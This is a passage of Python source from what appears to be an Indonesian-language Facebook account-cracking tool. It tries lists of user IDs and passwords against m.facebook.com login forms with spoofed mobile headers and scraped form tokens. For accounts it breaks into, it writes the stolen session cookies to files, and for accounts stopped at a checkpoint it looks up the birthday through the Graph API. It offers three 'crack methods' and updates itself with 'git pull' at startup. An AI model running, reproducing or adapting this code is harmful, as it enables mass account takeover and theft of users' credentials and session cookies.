				ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				r = ses.get("https://m.facebook.com/index.php")
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/home.php"}
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r  \033[0;92m--> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s\n"%(uid, pw, kuki))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					try:
						token = open("token.txt", "r").read()
						with requests.Session() as ses:
							ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
							month, day, year = ttl.split("/")
							month = bulan_ttl[month]
							print("\r  \033[0;93m--> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
							cp.append("%s|%s"%(uid, pw))
							open("CP/%s.txt"%(tanggal),"a").write("  --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
							break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
			loop +=1
		except:
			self.mobile(uid, listpw)

	def text_method(self):
		print(" \n [ pilih method crack - coba method satu ]\n")
		print(" [1]. method API (fast)")
		print(" [2]. method mbasic (slow)")
		print(" [3]. method mobile (very slow \033[0;92mpro\033[0;97m)")
if __name__=='__main__':
	os.system('git pull')
	Menu()
